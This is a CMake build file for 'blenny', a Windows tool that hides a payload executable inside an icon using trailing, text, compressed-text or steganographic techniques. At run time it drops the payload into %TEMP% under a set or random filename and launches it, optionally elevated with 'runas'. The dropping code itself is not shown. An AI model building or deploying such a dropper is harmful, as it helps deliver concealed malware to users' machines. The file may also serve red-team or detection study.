cmake_minimum_required(VERSION 3.24)

project(blenny CXX)
set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>")
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED True)

set(BLENNY_PAYLOAD_FILE "${PROJECT_SOURCE_DIR}/res/defaultpayload.exe" CACHE STRING "The payload file")
set(BLENNY_ICON_FILE "${PROJECT_SOURCE_DIR}/res/defaulticon.ico" CACHE STRING "The icon to add the payload to")
option(BLENNY_TRAILING_PAYLOAD "Facade trailing payload technique" OFF)
option(BLENNY_TEXT_PAYLOAD "Facade text payload technique" OFF)
option(BLENNY_ZTEXT_PAYLOAD "Facade ztext payload technique" OFF)
option(BLENNY_STEGO_PAYLOAD "Facade stego payload technique" OFF)
set(BLENNY_PAYLOAD_KEYWORD "blenny" CACHE STRING "The keyword to offer text/ztext payloads" )
option(BLENNY_ADMIN "Enable if you wish to run as admin" OFF)
set(BLENNY_PATH "%TEMP%" CACHE STRING "The directory to drop the payload into")
set(BLENNY_FILENAME "blenny" CACHE STRING "The filename of the payload without extension")
option(BLENNY_RANDOM_FILENAME "Enable if you wish to have a random filename" OFF)
set(BLENNY_RANDOM_FILENAME_LENGTH 8 CACHE STRING "Set the length of the random filename")
option(BLENNY_RANDOM_FILENAME_RANDOM_LENGTH "Enable if you wish the length of the filename to be random as well" OFF)
set(BLENNY_PAYLOAD_ARGS "" CACHE STRING "Add args to the payload file")
set(BLENNY_FILE_ATTRIBUTES 0x80 CACHE STRING "Create the file with specific attributes, see CreateFileA/W") # FILE_ATTRIBUTE_NORMAL
set(BLENNY_CMD_SHOW 5 CACHE STRING "The showing disposition of the window, see ShowWindow") # SW_SHOW

message(STATUS "${BLENNY_PATH}")
get_filename_component(BLENNY_PAYLOAD_EXT "${BLENNY_PAYLOAD_FILE}" LAST_EXT)

file(GLOB_RECURSE SRC_FILES ${PROJECT_SOURCE_DIR}/src/*.cpp)
file(GLOB_RECURSE HDR_FILES ${PROJECT_SOURCE_DIR}/src/*.hpp)
file(GLOB_RECURSE RC_FILES ${PROJECT_SOURCE_DIR}/res/*.rc)

source_group(TREE "${PROJECT_SOURCE_DIR}" PREFIX "Header Files" FILES ${HDR_FILES})
source_group(TREE "${PROJECT_SOURCE_DIR}" PREFIX "Source Files" FILES ${SRC_FILES})
source_group(TREE "${PROJECT_SOURCE_DIR}" PREFIX "Resource Files" FILES ${RC_FILES})

add_subdirectory(${PROJECT_SOURCE_DIR}/lib/facade)

file(GENERATE OUTPUT "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/payload.rc"
  CONTENT "#include <winresrc.h>\nMAINICON ICON \"${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/payload.ico\"\n")

# this header has to be generated because MSVC double-expands environment variables in the preprocessor
# and there's no way around it
file(GENERATE OUTPUT "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/config.hpp"
  CONTENT "#define BLENNY_PATH \"${BLENNY_PATH}\"\n")

add_executable(blenny WIN32 ${HDR_FILES} ${SRC_FILES})
target_sources(blenny PRIVATE ${RC_FILES} "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/payload.rc")

target_link_libraries(blenny libfacade)
add_dependencies(blenny facade)

target_include_directories(blenny PUBLIC
  "${PROJECT_SOURCE_DIR}/src"
  "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>"
  "${PROJECT_SOURCE_DIR}/lib/facade/libfacade/include"
)

if(BLENNY_TRAILING_PAYLOAD)
  set(BLENNY_FACADE_CMDLINE "-d \"${BLENNY_PAYLOAD_FILE}\"")
  add_compile_definitions(BLENNY_TRAILING_PAYLOAD)
elseif(BLENNY_TEXT_PAYLOAD)
  set(BLENNY_FACADE_CMDLINE "-t \"${BLENNY_PAYLOAD_KEYWORD}\" \"${BLENNY_PAYLOAD_FILE}\"")
  add_compile_definitions(BLENNY_TEXT_PAYLOAD="${BLENNY_PAYLOAD_KEYWORD}")
elseif(BLENNY_ZTEXT_PAYLOAD)
  set(BLENNY_FACADE_CMDLINE "-z \"${BLENNY_PAYLOAD_KEYWORD}\" \"${BLENNY_PAYLOAD_FILE}\"")
  add_compile_definitions(BLENNY_ZTEXT_PAYLOAD="${BLENNY_PAYLOAD_KEYWORD}")
elseif(BLENNY_STEGO_PAYLOAD)
  set(BLENNY_FACADE_CMDLINE "-s \"${BLENNY_PAYLOAD_FILE}\"")
  add_compile_definitions(BLENNY_STEGO_PAYLOAD)
else()
  message(FATAL_ERROR "No payload method specified.")
endif()

add_compile_definitions(BLENNY_EXT="${BLENNY_PAYLOAD_EXT}")

if (BLENNY_ADMIN)
  add_compile_definitions(BLENNY_ADMIN="runas")
else()
  add_compile_definitions(BLENNY_ADMIN=nullptr)
endif()

if (BLENNY_RANDOM_FILENAME)
  add_compile_definitions(BLENNY_RANDOM_FILENAME)

  if (BLENNY_RANDOM_FILENAME_RANDOM_LENGTH)
    add_compile_definitions(BLENNY_RANDOM_FILENAME_RANDOM_LENGTH)
  else()
    add_compile_definitions(BLENNY_RANDOM_FILENAME_LENGTH=${BLENNY_RANDOM_FILENAME_LENGTH})
  endif()
else()
  add_compile_definitions(BLENNY_FILENAME="${BLENNY_FILENAME}")
endif()

if (BLENNY_PAYLOAD_ARGS)
  add_compile_definitions(BLENNY_PAYLOAD_ARGS="${BLENNY_PAYLOAD_ARGS}")
else()
  add_compile_definitions(BLENNY_PAYLOAD_ARGS=nullptr)
endif()

add_compile_definitions(BLENNY_FILE_ATTRIBUTES=${BLENNY_FILE_ATTRIBUTES})
add_compile_definitions(BLENNY_CMD_SHOW=${BLENNY_CMD_SHOW})
  
add_custom_command(TARGET blenny PRE_BUILD
  COMMAND "$<TARGET_FILE:facade>" create
  -i "${BLENNY_ICON_FILE}" -o "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/payload.ico"
  ${BLENNY_FACADE_CMDLINE})
